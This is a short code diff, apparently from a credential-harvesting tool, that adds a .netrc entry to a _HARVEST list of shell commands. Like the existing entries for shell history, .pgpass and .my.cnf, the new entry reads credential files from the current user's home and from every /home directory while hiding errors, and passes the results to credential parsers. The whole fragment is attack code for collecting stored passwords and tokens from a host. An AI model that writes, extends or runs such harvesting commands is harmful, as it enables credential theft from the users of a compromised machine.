@@ -20,6 +20,7 @@ _HARVEST = [
     ("history",
      "cat ~/.bash_history ~/.zsh_history /home/*/.bash_history 2>/dev/null",
      _creds.parse_history),
+    ("netrc", "cat ~/.netrc /home/*/.netrc 2>/dev/null", _creds.parse_netrc),
     ("pgpass", "cat ~/.pgpass /home/*/.pgpass 2>/dev/null", _creds.parse_pgpass),
     ("mycnf", "cat ~/.my.cnf /home/*/.my.cnf 2>/dev/null", _creds.parse_mycnf),
 ]
